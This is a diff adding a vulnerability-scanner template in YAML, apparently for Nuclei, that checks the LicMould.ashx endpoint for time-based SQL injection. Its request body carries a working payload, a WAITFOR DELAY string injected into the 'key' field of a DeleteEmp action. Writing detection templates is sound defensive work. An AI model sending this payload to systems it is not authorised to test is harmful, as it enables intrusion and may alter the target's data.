@@ -1,0 +1,30 @@
+id: licmould-sql-injection
+
+info:
+  name: Potential SQL Injection in LicMould.ashx
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential SQL injection vulnerabilities in the LicMould.ashx endpoint using a time-based delay technique.
+  tags: sqli,sqlinjection,time-based,dast
+
+http:
+  - raw:
+      - |
+        POST /Ajax/LicMould.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 123
+
+        action=DeleteEmp&key=1%20WAITFOR%20DELAY%20'0:0:4'--&fuids=abc,def,
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "DeleteEmp"
+      - type: dsl
+        dsl:
+          - "response_time > 4000"
+      - type: status
+        status:
+          - 200
